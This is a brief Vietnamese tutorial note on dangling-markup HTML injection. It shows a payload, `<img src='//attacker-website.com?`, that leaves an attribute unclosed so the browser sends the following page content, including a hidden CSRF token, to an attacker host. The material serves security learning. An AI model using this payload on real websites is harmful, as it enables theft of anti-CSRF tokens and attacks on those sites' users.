# HTML Injection 
## Dangling Markup 
- **Dangling Markup** xảy ra khi website chèn nội dung do người dùng cung cấp vào trong một thuộc tính HTML nhưng quên đóng dấu nháy hoặc thẻ.

=>  **Kết quả:** trình duyệt tiếp tục đọc phần HTML phía sau như là một phần của giá trị thuộc tính đó.
- Payload `<img src='//attacker-website.com?`
- HTMLSource trở thành 
```html
<img src='https://attacker.com?</div>
<input type="hidden" name="csrf" value="1337">
</form>
<p>I'm hacked? Oh no!</p>
```
=> Kết quả là trình duyệt sẽ gửi một request hình ảnh tới URL sau (đã được mã hóa URL) : `https://attacker.com/?%3C/div%3E%3Cinput%20type=%22hidden%22%20name=%22csrf%22%20value=%221337%22%3E%3C/form%3E%3Cp%3EI
`

=> Lấy được **CSRF**

